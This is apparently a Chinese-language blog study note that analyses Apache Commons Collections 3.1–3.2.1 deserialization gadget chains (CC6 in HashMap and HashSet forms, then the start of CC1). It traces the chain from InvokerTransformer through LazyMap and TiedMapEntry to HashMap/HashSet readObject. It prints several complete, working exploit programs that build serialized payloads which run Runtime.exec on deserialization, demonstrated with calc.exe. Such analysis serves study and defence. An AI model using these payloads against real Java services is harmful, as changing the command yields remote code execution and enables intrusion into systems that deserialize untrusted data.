<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120155029208.png" class title="image-20250120155029208">



<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>CC6 链是 Commons Collections 反序列化漏洞 中影响范围最广的一条利用链，它仅受 Commons Collections 版本的影响，不受 Java 版本的限制。</p>
<p>受影响的 Commons Collections 范围：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">commons-collections：3.1 - 3.2.1</span><br></pre></td></tr></table></figure></div>

<p>环境配置</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250124155043383.png" class title="image-20250124155043383">

<p>本次漏洞分析环境采用 commons-collections 3.2.1 版本</p>
<h3 id="HashMap-版利用链"><a href="#HashMap-版利用链" class="headerlink" title="HashMap 版利用链"></a>HashMap 版利用链</h3><p>要实现反序列化命令执行，最基础的思路是通过 Runtime.exec() 触发计算器：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure></div>

<p>但我们不能直接调用 exec()，因此需要在 commons-collections 依赖中找到一个可利用的调用链来在反序列化时触发这个命令。</p>
<p><strong>Sink：</strong> </p>
<p>在 InvokerTransformer#transform 中有反射调用代码段，并且参数都是可控的</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125094426756.png" class title="image-20250125094426756">

<p>当 input 赋为 Runtime 对象并给 cls，cls.getMethod 封装 Runtime#exec 类方法元信息，再给 iArgs 赋为系统命令，此时调用 transform，能够达成上面的 “目标实现”</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125093229585.png" class title="image-20250125093229585">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125110812768.png" class title="image-20250125110812768">

<p><strong>Gadget：</strong></p>
<p>在明确了 InvokerTransformer#transform 方法的功能及其可用于命令执行的特性后，接下来的重点是分析调用链，即寻找哪些类能够直接或间接地调用 transform 方法</p>
<p>使用 IDEA 的 Find Usages 功能，搜索所有调用 transform 方法的代码路径</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125111336136.png" class title="image-20250125111336136">

<p>ChainedTransformer#transform 方法将 iTransformers 数组循环取出去调用数组内对象的 transform 方法，并将前一个方法返回结果作为调用数组下一对象的 object 参数，循环链式调用。</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125111552859.png" class title="image-20250125111552859">

<p>ConstantTransformer#transform 方法固定返回 iConstant 属性。</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125114807898.png" class title="image-20250125114807898">

<p>iTransformers 数组 与 iConstant 属性都可控，在实例化时赋值。</p>
<p>我们将 Runtime.getRuntime().exec(“calc.exe”); 改为反射形式</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method method = Runtime.class.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime runtime = (Runtime) method.invoke(null);</span><br><span class="line">runtime.exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure></div>

<p>并通过 ChainedTransformer#transform 与 ConstantTransformer#transform 实现上列反射流程，在走到 InvokerTransformer#transform 的 getMethod 方法时仍然需要指定形参类型</p>
<p>如果不指定，会报以下错误</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125121255215.png" class title="image-20250125121255215">

<p>getMethod 第二个参数 parameterTypes 用来精确匹配目标方法的参数签名，以定位要执行的方法，在反射调用使用 getMethod 时，必须制定好调用类方法的形参类型。Runtime#exec 内部接收的是 String 类型，因此第二个参数传入为 String.class</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125105726508.png" class title="image-20250125105726508">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125105920602.png" class title="image-20250125105920602">

<p>通过反射调用方法传入参数时，即使参数不给值，也需要传入 null</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125213453733.png" class title="image-20250125213453733">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        chainedTransformer.transform(null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250125123016834.png" class title="image-20250125123016834">

<p>接下来寻找调用 chainedTransformer#transform，在 LazyMap#get 中存在 factory.transform</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250126094908713.png" class title="image-20250126094908713">

<p>继续追链，TideMapEntry#getValue 中调用了 get 方法</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127181803984.png" class title="image-20250127181803984">

<p>同样在 TideMapEntry 类中，hashCode 去调用了 getValue</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127182333986.png" class title="image-20250127182333986">

<p>需要调用 hashCode 方法，正好 URLDNS 调用链同样是调用 hashCode，直接借用。Java 核心类库 HashMap 类中，hash 方法调用了 hashCode</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127182550220.png" class title="image-20250127182550220">

<p><strong>Source：</strong></p>
<p>最后 HashMap#readObejct 调用 hash，完成调用链闭环</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250127183314270.png" class title="image-20250127183314270">

<p>初步利用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        byte[] poc = Serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只进行序列化，发现序列化时就会触发命令执行</p>
<p>断点调试，发现是在 hashMap.put 的时候触发的</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129204224611.png" class>

<p>在 URLDNS 链中，URL#hashCode 方法存在 if 判断，通过将 hashCode 属性反射赋值为 -1 绕过了 put 执行，但 TiedMapEntry#hashCode 并没有 if 判断，一旦触发就会直接往后走，该如何绕过呢</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129204852113.png" class title="image-20250129204852113">

<p>解决方案：先让 LazyMap 使用 ConstantTransformer(1) 占位，干扰原始 transform() 的调用时机，再修改 factory 属性为 ChainedTransformer，确保最后执行反序列化时利用链正确。</p>
<p>执行，发现又出现新的问题，反序列化时也不触发 exec 了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        SetFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        byte[] poc = Serialize(hashMap);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SetFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续断点逐步调试，containsKey(Object key) 用于判断 Map 是否包含指定的 key，如果 key 存在于 Map 中，则返回 true，否则返回 false。显然程序在 LazyMap#get 处没能按照预期进入 if 方法体内</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129212941404.png" class title="image-20250129212941404">

<p>解决方法：去除 LazyMap key 属性</p>
<p>最终 Exp</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        SetFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        lazyMap.remove(&quot;abc&quot;);</span><br><span class="line">        byte[] poc = Serialize(hashMap);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SetFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129213348869.png" class title="image-20250129213348869">

<p>Gadget chain：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">	java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.hash()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            	java.lang.reflect.Method.invoke()</span><br><span class="line">                                	java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure></div>



<h3 id="HashSet-版利用链"><a href="#HashSet-版利用链" class="headerlink" title="HashSet 版利用链"></a>HashSet 版利用链</h3><p>在 ysoserial 项目 cc6 payload 中，调用链入口是 HashSet，再到 HashMap，其他一致</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129213907608.png" class title="image-20250129213907608">

<p>依然回到 hashCode 的分析上，前面都一致</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129204852113.png" class title="image-20250129204852113">

<p>在 HashMap#put 方法中，同样能够进行 hash -&gt; hashCode</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129220821800.png" class title="image-20250129220821800">

<p>再往前追，让HashSet#readObject 的 map 属性赋为 HashMap 即可，调用链完成</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129221055792.png" class title="image-20250129221055792">

<p>Exp：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        HashSet hashSet = new HashSet();              //1. 在 HashMap版基础上修改这三段代码即可</span><br><span class="line">        SetFieldValue(hashSet, &quot;map&quot;, hashMap);       //2</span><br><span class="line">        SetFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        lazyMap.remove(&quot;abc&quot;);</span><br><span class="line">        byte[] poc = Serialize(hashSet);              //3</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SetFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap-版"><a href="#TransformedMap-版" class="headerlink" title="TransformedMap 版"></a>TransformedMap 版</h3><p>在已经分析过 CC6 的前提下分析 CC1，从 ChainedTransfomer#transform 继续往前找调用链</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204165540576.png" class title="image-20250204165540576">

<p>在 TransformedMap#checkSetValue 方法调用了 transform，且该方法为 protected 修饰</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204165518306.png" class title="image-20250204165518306">

<p>valueTransformer 属性可以通过 TransformedMap#decorate 返回构造方法赋值，接下来寻找一个调用 checkSetValue 的类</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204170216540.png" class title="image-20250204170216540">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204170224154.png" class title="image-20250204170224154">

<p>在 AbstractInputCheckedMapDecoratorMapEntry#setValue 方法调用了 checkSetValue<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204170444337.png" class title="image-20250204170444337"></p>
<p>setValue 也无法被直接调用，继续往前找</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204174232158.png" class title="image-20250204174232158">

<p>在 AnnotationInvocationHandler#readObject 中调用了 setValue 方法，那么接下来根据链子构造代码</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204174625747.png" class title="image-20250204174625747">

<p>初步：</p>
<p>在序列化 invokerTransformer 时，实质上是序列化了 AnnotationInvocationHandler，因此反序列化时会自动调用其 readObject 方法，也就是 AnnotationInvocationHandler#readObject</p>
